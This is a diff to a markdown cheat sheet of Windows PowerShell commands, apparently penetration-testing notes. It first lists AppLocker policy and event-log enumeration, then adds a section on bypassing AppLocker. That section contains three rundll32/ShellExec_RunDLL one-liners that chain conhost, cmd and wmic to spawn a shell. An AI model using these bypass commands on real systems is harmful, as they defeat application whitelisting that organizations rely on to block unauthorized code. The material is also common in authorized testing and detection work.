@@ -122,8 +122,8 @@ Get-AppLockerPolicy -Effective
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollectionTypes
 ```
 
-## Retrive code execution policies configured in the registry 
- - Not limited to AppLocker, helpful for situational awareness at times
+## Retrive all code execution policies configured in the registry 
+ - Includes AppLocker (HKLM:Software\Policies\Microsoft\Windows\SrpV2) alongside other policies, helpful for situational awareness 
 ```
 Get-ChildItem -Recurse 'HKLM:SOFTWARE\Policies' -ErrorAction SilentlyContinue | more
 ```
@@ -157,6 +157,23 @@ Get-WinEvent -FilterHashtable @{LogName = 'Microsoft-Windows-PowerShell/Operatio
 Get-WinEvent -FilterHashtable @{LogName = 'Microsoft-Windows-PowerShell/Operational' ; Id = 4100 } -ErrorAction SilentlyContinue | Select-Object -Property TimeCreated,Id,LevelDisplayName,Message | ConvertTo-Csv -NoTypeInformation
 ```
 
+# AppLocker Bypass & Code Execution
 
 
+## LOLBAS - rundll32 -> chained with conhost.exe & Windows Command Shell (ie: cmd /c ) to run PowerShell 
 
+```
+rundll32 C:\Windows\System32\shell32.dll,ShellExec_RunDLL conhost.exe cmd /c powershell
+```
+
+## Alternative 1 - ## LOLBAS - rundll32 -> chained with conhost.exe to run Windows Command Shell
+
+```
+rundll32 shell32.dll,ShellExec_RunDLL cmd.exe
+```
+
+## Alternative 2 - ## LOLBAS - rundll32 -> chained with conhost.exe to run wmic and spawn Windows Command Shell
+
+```
+rundll32 C:\Windows\System32\shell32.dll,ShellExec_RunDLL conhost.exe wmic /node:"localhost" process call create "cmd.exe /K whoami"
+```
